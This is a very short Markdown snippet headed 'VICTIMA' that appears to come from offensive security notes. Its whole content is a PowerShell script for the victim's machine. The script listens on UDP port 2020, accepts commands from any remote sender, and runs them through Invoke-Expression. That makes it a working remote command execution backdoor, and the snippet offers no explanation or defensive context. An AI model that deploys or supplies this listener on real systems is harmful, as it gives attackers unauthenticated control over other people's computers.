### VICTIMA

```POWERSHELL
$port=2020
$endpoint = new-object System.Net.IPEndPoint ([IPAddress]::Any,$port)
$udpclient=new-Object System.Net.Sockets.UdpClient $port
$content=$udpclient.Receive([ref]$endpoint)
$reci= [Text.Encoding]::ASCII.GetString($content)
$udpclient.Dispose()
$reci | iex
```
